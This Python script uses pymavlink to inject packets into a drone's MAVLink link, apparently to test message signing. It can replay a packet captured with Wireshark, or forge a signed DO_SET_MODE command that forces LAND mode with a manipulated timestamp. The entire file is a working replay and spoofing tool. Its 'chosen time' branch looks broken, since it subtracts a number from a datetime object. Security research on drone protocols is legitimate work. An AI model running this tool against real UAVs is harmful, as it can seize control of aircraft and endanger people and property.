from pymavlink.generator import mavcrc
from pymavlink import mavutil

import hashlib
import time
import struct

from datetime import datetime as dt

# Set the IP and PORT of the UAV for the UDP connection
# For MAVProxy to relay to the UAV in simulations, use port 5765
IP = "0.0.0.0"
PORT = 5760

# If relaying with a second GCS, ensure telemtry forwarding is enabled in that GCS as well!
# Create the connection to MAVProxy
master = mavutil.mavlink_connection(f"udpin:{IP}:{PORT}")

print(f"Waiting for heartbeat on {IP}:{PORT}")

# Wait for a heartbeat before generating the message or sending commands
master.wait_heartbeat()

print("Got heartbeat")

key = input("Enter the secret key: ").encode('ascii')

choice = int(input("Choose your mode - replay [0] or custom time [1]:\n\n"))

# Custom time mode
if (choice == 1):

    # Set the offset in seconds for the timestamp in the packet, from current time
    # I.e. if this is 86400, offset the timestamp by one day
    choice = int(input("Enter whether you want to be in offset mode [0] or chosen mode [1]:\n"))

    # ================================================================================ #

    # Search for the message class in pymavlink.dialects.v20.common.py (or other message definition files), then fill out the fields below:

    # Get MSG_ID from <class>.id
    # 76 == MAVLINK_COMMAND_LONG
    # (which we use to put MAV_CMD_DO_SET_MODE inside of)
    # https://mavlink.io/en/messages/common.html#MAV_CMD_DO_SET_MODE
    MSG_ID = 76

    # Specify the message's SEQ number
    SEQ = 200

    # Specify how the structure should be packed, using the string in <class>.unpacker
    STRUCT_PACK = "<fffffffHBBB"

    # Specify the payload arguments as a list (check the order of these from <class>.ordered_fieldnames)
    # ["param1", "param2", "param3", "param4", "param5", "param6", "param7", "command", "target_system", "target_component", "confirmation"]

    # https://github.com/ArduPilot/ardupilot/blob/master/ArduCopter/mode.h
    # 176 == MAV_CMD_DO_SET_MODE (see above)
    PAYLOAD = [0xD9,9,0,0,0,0,0, 176, 1, 0, 0]

    # Get the CRC_EXTRA byte from <class>.crc_extra
    # See: https://mavlink.io/en/guide/serialization.html#crc_extra
    CRC_EXTRA = 152

    # ================================================================================ #

    # SYS, CMP & LINK IDs
    # Specify that this comes from the GCS
    SYSID = 255
    CMPID = 230
    LINKID = 1

    # INC & CMP Flags
    INCF = 1
    CMPF = 0

    MAGIC = 0xFD

    # This is the MAVLink offset from the beginning of UNIX time
    # see: https://mavlink.io/en/guide/message_signing.html#timestamp
    MAVOFFSET = 1420070400

    # ================================================================================ #

    # Given the secret key as a bytearray, serialise the message defined at the top
    # of the program
    def serialiseMessage(key):

        # Pack the payload according to the packing arguments defined at the top of the program
        payload = struct.Struct(STRUCT_PACK).pack(*PAYLOAD)

        # Truncate the payload's 0-bytes
        length = len(payload)

        while (length > 1 and payload[length - 1] == 0):
            length-=1

        payload = payload[:length]

        magic = bytearray([MAGIC])
        link = bytearray([LINKID])

        # Serialise the body into bytes
        body = bytearray(
            [
            len(payload), # Payload Length
            INCF, # INC flag
            CMPF, # CMP flag
            SEQ, # SEQ
            SYSID, # SYS ID
            CMPID, # CMP ID
            ]
            + list(MSG_ID.to_bytes(3, "little")) # MSG ID
            + list(payload) # Payload
        )

        # Generate the message's CRC bytes
        crc = mavcrc.x25crc_slow(body + bytearray([CRC_EXTRA])).crc.to_bytes(2, "little")

        # Hash the message with SHA256, with the key appended (to generate the signature)
        m = hashlib.sha256()
        m.update(key)
        m.update(magic)
        m.update(body)
        m.update(crc)
        m.update(link)

        TIME_INPUT = 0

        if (choice == 0):
            TIME_INPUT = int(input("Enter your offset (e.g. 86400 to be 1 day ahead of the current time)\n"))

        else:
            TIME_INPUT = int(input(f"Enter your chosen time in unix seconds since 1st Jan 1970 (e.g. {time.time()} for the current time)"))


        # Time in offset mode
        if(choice == 0):
            TIME = time.time() + TIME_INPUT

        # Time in chosen mode
        if(choice == 1):
        # Generate the timestamp as an offset from current time
            TIME = dt.fromtimestamp(TIME_INPUT)

        timestamp = bytearray(int((TIME - MAVOFFSET)*1e5).to_bytes(6, "little"))

        m.update(timestamp)

        # Truncate the hash to only 6 bytes in length
        hash = bytearray([x for x in m.digest()[:6]])

        # Return the fully serialised packet
        return (magic + body + crc + link + timestamp + hash)

    # ================================================================================ #

    # Ask the user for the secret key, and convert that to bytes in the same way MAVProxy does. See:
    # https://github.com/ArduPilot/MAVProxy/blob/ 594d661ffe81a4b8b362963e0604cbcea46cc16a/MAVProxy/modules/mavproxy_signing.py#L39
    k = hashlib.sha256()
    k.update(key)
    key = k.digest()

    # Generate the serialised packet
    packet = serialiseMessage(key)

    print("Sending packet to switch to LAND mode")

    # Print the packet for the user
    for b in packet:
        print(f"{b:02X}", end=" ")
    print("\n")

    buf = list(packet)
    timeInt = int.from_bytes(bytearray(buf[44:50]), byteorder="little", signed=False) # ten micro sec units since jan 2015

    timeInt *= 1e-5 # convert into seconds
    timeInt += MAVOFFSET # ten microsecond units since start
    print("Time in signature:", dt.fromtimestamp(timeInt).strftime('%Y-%m-%d %H:%M:%S'))

    # Send the packet to the UAV
    # https://github.com/ArduPilot/pymavlink/blob/ f7dd7261f01181fb9ff824a9bd8906e3ec0a4beb/mavutil.py#L1105
    master.write(packet)

    print("Sent packet")

elif (choice == 0):

    # Ask the user for the given message, in the format received from Wireshark when using "copy as hex stream"
    # I.e. of the style: fd160100e30101c100000000000000000000000000000000000000000000 7f03514800b363a6a47c1d3e1b40d7896e
    packet = input("Enter the packet, as bytes: ")

    # Strip the stream and convert it to hex
    packet = bytearray.fromhex(packet.strip())

    # Print the packet for the user
    for b in packet:
        print(f"{b:02X}", end=" ")
    print("\n")

    # Send the packet to the UAV
    # https://github.com/ArduPilot/pymavlink/blob/ f7dd7261f01181fb9ff824a9bd8906e3ec0a4beb/mavutil.py#L1105
    master.write(packet)

    print("Sent packet")